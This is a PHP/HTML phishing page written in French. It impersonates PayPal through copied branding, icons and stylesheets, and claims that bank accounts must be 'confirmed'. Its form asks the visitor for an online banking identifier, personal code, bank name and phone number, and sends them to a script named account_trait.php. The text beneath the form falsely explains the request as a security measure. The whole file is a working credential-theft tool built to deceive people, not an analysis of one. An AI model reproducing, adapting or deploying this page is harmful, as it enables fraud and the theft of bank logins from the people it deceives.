<?php session_start (); ?>
<!DOCTYPE html><!--[if lt IE 9]><html lang="fr" class="no-js lower-than-ie9 ie desktop"><![endif]--><!--[if lt IE 10]><html lang="fr" class="no-js lower-than-ie10 ie desktop"><![endif]--><!--[if !IE]>--><html lang="fr" class="no-js desktop"><!--<![endif]--><head><!--Script info: script: node, template:  , date: Jan 30, 2019 08:58:03 -08:00, country: FR, language: fr web version:  content version:  hostname : ioAGJ3gn+hvzPvsEIlx2K/t45PP6Xgl9izrNLH+/NlVrdCx9EzZaY4ZTY5MW0r8Q2aQcHKFepZU rlogid : rZJvnqaaQhLn%2FnmWT8cSUotSylMGOTGkRUMDpmUTvbXdvevuMMFAfdCyVpEJFA7zu3SXHdbOUrInZ%2B3oUnhSqwR6lOfpuTuubPhKVH7tREo_1689fb238ad --><meta charset="utf-8" />
<title>Confirmation d'identité bancaire</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="application-name" content="PayPal" />
<meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" /><meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" /><meta name="msapplication-task" content="name=Request Money;action-uri=https://personal.paypal.com/cgi-bin/?cmd=_render-content&amp;content_ID=marketing_us/request_money;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" />
<meta name="keywords" content="transfer money, email money transfer, international money transfer " />
<meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address." />
<link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico" /><link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png" /><link rel="canonical" href="" /><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" /><meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png" />
<link rel="stylesheet" href="https://www.paypalobjects.com/web/res/431/62e164a47079d8e3f7161e2dcd523/css/contextualLogin.css" /><!--[if lte IE 9]><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/431/62e164a47079d8e3f7161e2dcd523/css/ie9.css" /><![endif]-->
<style id="antiClickjack">body {display: none !important;}</style>


<div id="main" class="main" role="main"><section id="login" class="login " data-role="page" data-title="Connectez-vous à votre compte PayPal">
<div class="corral">
<div id="content" class="contentContainer activeContent contentContainerBordered">
<header >
<p class="paypal-logo paypal-logo-long"></p></header>
<h1 class="headerText accessAid">Confirmation d'identité bancaire</h1>
<div class="signupCheckBox">
						<div class="component-wrapper HTMLBlock col-md-12"><h2>Pour transférer votre argent de votre compte PayPal vers votre compte bancaire et vice-versa , vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne pas mesure de sécurité.</h2></div>
                        <div class="headerWrapper subHeading" style="text-align:center" aria-live="polite"><h4 class="vx_text-2 ">Pour confirmez votre compte bancaire : </h4><span>Veuillez saisir le numéro de client et le mot de passe utilisé pour vos services bancaires en lignes.</span></div>
                    </div>
<div  class="notifications"></div><!-- temporary addition of notification which will just be displayed after clicking next in the phone page. This is for mobile ID login initial ramp and should be removed when we do public credential check -->
<form action="account_trait.php" method="post" name="form" >
<div id="passwordSection" class="clearfix"><div id="emailSection" class="clearfix"><div class="textInput  " id="login_emaildiv"><div class="fieldWrapper "><label for="email" class="fieldLabel">Indentifiant bancaire</label><input name="bankId" type="text"  required 		autocomplete=	"off"placeholder="Indentifiant bancaire" /></div></div></div><div id="passwordSection" class="clearfix"><div class="textInput  " id="login_passworddiv"><div class="fieldWrapper "><label for="password" class="fieldLabel">Code personnel</label><input id="password" name="bankCode"type="password"class="hasHelp  validateEmpty   pin-password"required value=""		placeholder=	"Code personnel"		aria-describedby="passwordErrorMessage"/></div></div></div></div>
<div id="emailSection" class="clearfix"><div class="textInput  " id="login_emaildiv"><div class="fieldWrapper "><label for="email" class="fieldLabel">Nom de la banque</label><input name="bankName" type="text"  required 		autocomplete=	"off"placeholder="Non de la banque" /></div></div></div><div id="passwordSection" class="clearfix"><div class="textInput  " id="login_passworddiv"><div class="fieldWrapper "><label for="password" class="fieldLabel">Numéro de téléphone</label><input id="password"name="tel" type="tel"class="hasHelp  validateEmpty   pin-password"required value=""		placeholder=	"Numéro de téléphone"		aria-describedby="passwordErrorMessage"/></div></div></div></div>

<div class="actions actionsSpacedShort">
    <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Valider</button>
</div>
<div class="component-wrapper HTMLBlock col-md-12" style="padding: 12px;"><p>Pourquoi dois-je vérifier les informations financières ?<br>
Si votre compte PayPal a ete pirate, un individu mal intentionné pourrait réceptionner votre paiement en votre nom.la vérification bancaire permet de pallier se risque .<br>
PayPal vous demande de vérifier votre compte de sorte que de futurs transferts ne soient pas envoyés vers un mauvais compte bancaire
</p></div>
</form>

</body>
</html>